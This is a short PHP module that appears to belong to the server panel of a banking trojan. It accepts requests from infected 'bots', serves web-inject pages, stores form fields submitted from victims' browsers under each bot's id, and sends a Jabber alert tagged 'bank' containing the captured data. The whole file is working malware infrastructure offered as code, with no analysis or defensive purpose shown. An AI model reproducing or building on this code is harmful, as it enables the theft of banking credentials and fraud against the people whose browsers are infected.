<?php
if(!defined('MODE') || MODE != 'bot') hlp::show_404();
require_once "injects.php";
require_once "bot_api.php";

class Bot extends coreModule
{
	function __construct()
	{
		parent::__construct(); // connect db, load config to $this->client_cfg
	}
	
	// BOT REQUEST
	// $data is an array from bot json
	// response in json or 404
	public function process_request($data)
	{
		$api = new botApi($this->db, $this->client_cfg);
		$result = $api->process($data);
		
		return $result;
	}

	// GET/SAVE INJECT data
	// response in html
	// bot_id from Etage, data - post data from a filled form
	public function process_inject($bot_id, $inject_id, $data, $debug=false, $language='')
	{
		$jabb = new Jabber($this->db, $this->client_cfg);
		
		$inj = new Injects($this->db, $this->client_cfg, $language);
		if(!$this->db->is_connected)
			return $inj->black_screen();

		$inj->debug = $debug;
		if(!empty($data['fields'])){
			$jabb->send_notify("bank", $bot_id, $data);
			return $inj->save($bot_id, $data); // save data
		}else if(!empty($data['res'])){ 
			return $inj->show_resource($data); // show resource
		}else
			return $inj->draw($bot_id, $inject_id, $data); // show page
	}
}

